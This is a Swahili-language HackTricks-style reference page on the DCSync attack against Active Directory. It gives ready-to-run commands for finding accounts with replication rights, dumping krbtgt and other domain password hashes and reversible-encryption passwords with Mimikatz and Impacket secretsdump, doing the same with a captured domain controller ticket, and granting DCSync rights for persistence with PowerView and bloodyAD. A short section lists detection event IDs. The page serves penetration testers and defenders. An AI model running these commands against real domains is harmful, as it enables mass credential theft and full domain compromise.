# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Ruhusa ya **DCSync** inamaanisha kuwa na ruhusa hizi kwenye domain yenyewe: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** na **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Maelezo Muhimu kuhusu DCSync:**

- **DCSync attack huiga tabia ya Domain Controller na kuwaomba Domain Controllers wengine wa-replicate taarifa** kwa kutumia Directory Replication Service Remote Protocol (MS-DRSR). Kwa sababu MS-DRSR ni function halali na muhimu ya Active Directory, haiwezi kuzimwa au ku-disable.
- Kwa default, ni makundi ya **Domain Admins, Enterprise Admins, Administrators, na Domain Controllers** pekee yenye privileges zinazohitajika.
- Kwa vitendo, **full DCSync** inahitaji **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** kwenye domain naming context. `DS-Replication-Get-Changes-In-Filtered-Set` mara nyingi hu-delegatiwa pamoja nazo, lakini ikiwa peke yake inahusiana zaidi na kusync **confidential / RODC-filtered attributes** (kwa mfano secrets za zamani za mtindo wa LAPS) kuliko dump kamili ya krbtgt.<sup>[[2]](#references)</sup>
- Ikiwa password za akaunti zimehifadhiwa kwa reversible encryption, kuna option kwenye Mimikatz ya kurejesha password ikiwa clear text

### Enumeration

Kagua ni nani aliye na ruhusa hizi ukitumia `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Ikiwa unataka kuzingatia principals zisizo za default zilizo na haki za DCSync, chuja makundi ya built-in yenye uwezo wa replication na kagua trustees wasiotarajiwa:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Exploit Kwenye Mfumo wa Ndani
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploit kwa Mbali
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Mifano ya vitendo yenye upeo maalum:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync kwa kutumia DC machine TGT (ccache) iliyokamatwa

Katika matukio ya unconstrained-delegation export-mode, unaweza kukamata Domain Controller machine TGT (mfano, `DC1$@DOMAIN` kwa ajili ya `krbtgt@DOMAIN`). Kisha unaweza kutumia ccache hiyo kujithibitisha kama DC na kutekeleza DCSync bila password.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Operational notes:

- **Impacket's Kerberos path** hugusa SMB kwanza kabla ya mwito wa DRSUAPI. Ikiwa mazingira yanalazimisha **SPN target name validation**, full dump inaweza kushindikana kwa ujumbe `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Katika hali hiyo, ama omba service ticket ya **`cifs/<dc>`** kwa target DC kwanza, au tumia **`-just-dc-user`** kwa account unayohitaji mara moja.
- Unapokuwa na lower replication rights pekee, LDAP/DirSync-style syncing bado inaweza kufichua attributes zilizo **confidential** au **RODC-filtered** (kwa mfano `ms-Mcs-AdmPwd`) bila kufanya full krbtgt replication.<sup>[[2]](#references)</sup>

`-just-dc` hutengeneza files 3:

- moja yenye **NTLM hashes**
- moja yenye **Kerberos keys**
- moja yenye cleartext passwords kutoka NTDS kwa accounts zozote zilizowekewa [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Unaweza kupata users walio na reversible encryption kwa kutumia

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Ikiwa wewe ni domain admin, unaweza kumpa user yeyote ruhusa hizi kwa msaada wa `powerview`:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Waendeshaji wa Linux wanaweza kufanya vivyo hivyo kwa kutumia `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Kisha, unaweza **kuangalia ikiwa mtumiaji alipewa kwa usahihi** privileges 3 kwa kuzitafuta kwenye output ya (unapaswa kuona majina ya privileges ndani ya sehemu ya "ObjectType"):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Kinga

- Security Event ID 4662 (Sera ya ukaguzi wa object lazima iwezeshwe) – Operesheni ilifanywa kwenye object<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Sera ya ukaguzi wa object lazima iwezeshwe) – Object ya directory service ilirekebishwa
- Security Event ID 4670 (Sera ya ukaguzi wa object lazima iwezeshwe) – Ruhusa kwenye object zilibadilishwa
- AD ACL Scanner - Unda na linganisha ripoti za ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Marejeo

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Leveraging Replication Get-Changes and Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Dump Password Hashes from Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
